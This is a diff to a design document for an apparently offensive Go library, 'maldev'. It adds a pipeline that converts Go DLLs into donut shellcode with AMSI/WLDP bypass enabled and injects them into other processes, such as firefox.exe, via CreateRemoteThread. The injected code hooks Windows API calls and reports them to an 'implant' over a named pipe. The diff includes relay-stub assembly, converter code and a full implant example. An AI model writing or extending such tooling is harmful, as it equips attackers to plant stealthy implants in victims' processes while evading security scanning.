@@ -287,6 +287,170 @@ Each shellcode is a pre-assembled x64 byte sequence with sentinel placeholders:
 
 `Chain` patches each shellcode's epilogue to JMP to the next instead of RET. The last one RETs normally. This allows composing: `Chain(LogToPipe(pipe), Nop())` = log then forward.
 
+## Package 7: Donut-Based Go Handler for Remote Hooks
+
+### Purpose
+
+Allow writing remote hook handlers as normal Go code (a DLL with an exported
+entry point), converting them to shellcode via `pe/srdi` (go-donut), and
+injecting them into the target process. The Go handler gets the hooked
+function's arguments via a bridge mechanism.
+
+### Flow
+
+```
+Parent Process                        Target Process
+    │                                      │
+    ├─ go build -buildmode=c-shared        │
+    │  → handler.dll (exports HandlerEntry)│
+    │                                      │
+    ├─ srdi.ConvertDLL("handler.dll",      │
+    │    &srdi.Config{Method:"HandlerEntry"})
+    │  → handlerShellcode []byte           │
+    │                                      │
+    ├─ hook.RemoteInstall(pid, dll, fn,    │
+    │    handlerShellcode,                 │
+    │    hook.WithMethod(MethodCRT))  ────→│ Donut loader runs:
+    │                                      │  1. Patches AMSI/WLDP
+    │                                      │  2. Maps handler.dll
+    │                                      │  3. Resolves imports
+    │                                      │  4. Calls HandlerEntry
+    │                                      │
+    │  [Optional: named pipe for config]   │  Handler connects to pipe
+    │  listener ◄──────────────────────────│  for args/results
+    │                                      │
+```
+
+### Bridge Package: `evasion/hook/bridge`
+
+The handler DLL imports `bridge` to read the hooked function's arguments.
+The bridge works via shared memory: the relay stub saves RCX/RDX/R8/R9
+into a known offset before jumping to the donut shellcode.
+
+```go
+package bridge
+
+// ArgBlock is written by the relay stub at a known address in the target process.
+// The relay saves the first 4 register args + stack args before jumping to the handler.
+type ArgBlock struct {
+    Args [18]uintptr
+    TrampolineAddr uintptr
+}
+
+// ReadArgs reads the argument block saved by the relay stub.
+// Must be called from within the hook handler running in the target process.
+func ReadArgs() *ArgBlock
+
+// CallOriginal calls the original function via the trampoline address
+// stored in the ArgBlock.
+func CallOriginal(args ...uintptr) uintptr
+```
+
+### Relay Stub Extension
+
+The relay stub for donut-based handlers is extended (vs the simple 13-byte
+absolute JMP for template shellcodes):
+
+```asm
+; Save register args to ArgBlock (allocated in target process)
+mov [argblock+0x00], rcx
+mov [argblock+0x08], rdx
+mov [argblock+0x10], r8
+mov [argblock+0x18], r9
+; Save trampoline address
+mov rax, <trampoline_addr>
+mov [argblock+0x90], rax
+; Jump to donut shellcode
+mov r10, <donut_shellcode_addr>
+jmp r10
+```
+
+~60 bytes, position-independent with sentinel placeholders.
+
+### Helper: `hook.GoHandler`
+
+Convenience function that does the full pipeline:
+
+```go
+// GoHandler converts a Go handler DLL to shellcode ready for RemoteInstall.
+// The DLL must export the function named by entryPoint.
+func GoHandler(dllPath string, entryPoint string) ([]byte, error) {
+    cfg := &srdi.Config{
+        Arch:   srdi.ArchX64,
+        Type:   srdi.ModuleDLL,
+        Method: entryPoint,
+        Bypass: 3, // AMSI/WLDP continue on fail
+    }
+    return srdi.ConvertFile(dllPath, cfg)
+}
+
+// GoHandlerBytes does the same from in-memory DLL bytes.
+func GoHandlerBytes(dllBytes []byte, entryPoint string) ([]byte, error) {
+    cfg := &srdi.Config{
+        Arch:   srdi.ArchX64,
+        Type:   srdi.ModuleDLL,
+        Method: entryPoint,
+        Bypass: 3,
+    }
+    return srdi.ConvertBytes(dllBytes, cfg)
+}
+```
+
+### Full Example
+
+```go
+// === Handler DLL (separate Go module, built as c-shared) ===
+// handler/main.go
+package main
+
+import "C"
+import (
+    "github.com/oioio-space/maldev/evasion/hook/bridge"
+    "github.com/oioio-space/maldev/c2/transport/namedpipe"
+)
+
+//export HandlerEntry
+func HandlerEntry() {
+    args := bridge.ReadArgs()
+    // args.Args[0] = lpFileName (for DeleteFileW)
+    
+    // Report back to implant via named pipe
+    p := namedpipe.New(`\\.\pipe\hookresults`, 5*time.Second)
+    p.Connect(context.Background())
+    fmt.Fprintf(p, "DeleteFileW called: %x\n", args.Args[0])
+    p.Close()
+    
+    // Call original
+    bridge.CallOriginal(args.Args[:]...)
+}
+
+func main() {}
+
+// === Implant (injects the handler into Firefox) ===
+// Build handler: go build -buildmode=c-shared -o handler.dll ./handler/
+shellcode, _ := hook.GoHandler("handler.dll", "HandlerEntry")
+
+hook.RemoteInstallByName("firefox.exe", "kernel32.dll", "DeleteFileW", shellcode,
+    hook.WithMethod(inject.MethodCreateRemoteThread),
+    hook.WithRemoteCaller(caller),
+)
+
+// Listen for results
+listener, _ := namedpipe.NewListener(`\\.\pipe\hookresults`)
+conn, _ := listener.Accept(ctx)
+io.Copy(os.Stdout, conn) // prints intercepted calls
+```
+
+### Existing Infrastructure Used
+
+| Component | Role |
+|-----------|------|
+| `pe/srdi` | Convert Go DLL → position-independent shellcode (go-donut) |
+| `inject/` | Inject shellcode into target process (15+ methods) |
+| `process/enum` | Resolve process name → PID |
+| `c2/transport/namedpipe` | IPC between implant and handler |
+| `evasion/hook` (relay/trampoline) | Install the hook in target process |
+
 ## Architecture
 
 ```
@@ -301,8 +465,12 @@ evasion/hook/                   Layer 2 — hooking engine
     hook_stub.go                !windows stub (modified)
     probe_windows.go            InstallProbe/InstallProbeByName
     group_windows.go            HookGroup + InstallAll
-    remote_windows.go           RemoteInstall/RemoteInstallByName
+    remote_windows.go           RemoteInstall/RemoteInstallByName + GoHandler
     hook_windows_test.go        (existing + new tests)
+
+evasion/hook/bridge/            Layer 2 — cross-process arg bridge
+    bridge_windows.go           ReadArgs, CallOriginal
+    bridge_stub.go              !windows stub
 
 evasion/hook/shellcode/         Layer 2 — shellcode templates
     shellcode.go                Block, Nop, Replace, Redirect
@@ -320,6 +488,8 @@ pe/imports → debug/pe (stdlib)
 evasion/hook → win/api, win/syscall, evasion/unhook (for WithCleanFirst)
 evasion/hook → inject (for RemoteInstall)
 evasion/hook → process/enum (for RemoteInstallByName)
+evasion/hook → pe/srdi (for GoHandler)
+evasion/hook/bridge → win/api (for ReadArgs/CallOriginal)
 evasion/hook/shellcode → (no maldev deps, self-contained byte templates)
 ```
 
@@ -329,13 +499,19 @@ evasion/hook/shellcode → (no maldev deps, self-contained byte templates)
 - `Install` + options: existing GetTickCount tests + new WithCaller/WithCleanFirst tests
 - `InstallProbe`: hook GetTickCount, verify NonZeroCount() >= 0 (no args)
 - `HookGroup`: install 3 hooks, verify all called, RemoveAll restores all
-- `RemoteInstall`: inject into a spawned sacrificial process (notepad), verify hook patch in target memory. Use `testutil.SpawnAndResume`.
+- `RemoteInstall`: inject into spawned sacrificial process (notepad), verify hook patch in target memory via `ReadProcessMemory`. Use `testutil.SpawnAndResume`.
+- `GoHandler`: build a minimal test DLL, convert via srdi, verify shellcode is non-empty
+- `bridge`: unit test ArgBlock serialization/deserialization
 - Shellcodes: unit test each template (verify correct byte sequences, placeholder replacement)
+- **VM-only tests** (tagged `intrusive`): full end-to-end RemoteInstall into notepad with real hook verification
 
 ## Limitations (documented)
 
 - `InstallProbe` is heuristic — 0-valued real params are invisible
-- `RemoteInstall` handler is shellcode, not Go — no Go runtime in target process
-- `syscall.NewCallback` supports max ~18 uintptr params
+- `RemoteInstall` template shellcode handler has no Go runtime — limited to raw Win32 calls
+- `GoHandler` (donut-based) has full Go runtime but adds ~2MB to shellcode size
+- `syscall.NewCallback` supports max ~18 uintptr params (local hooks only)
 - `Chain` requires each shellcode to be position-independent
 - Don't hook Go runtime critical functions (NtClose, NtCreateFile, NtReadFile, NtWriteFile)
+- Cross-process hooking of non-system DLLs requires module enumeration to find base address
+- `bridge.ReadArgs` relies on a fixed-offset shared memory layout — relay stub and bridge must agree on the ArgBlock address
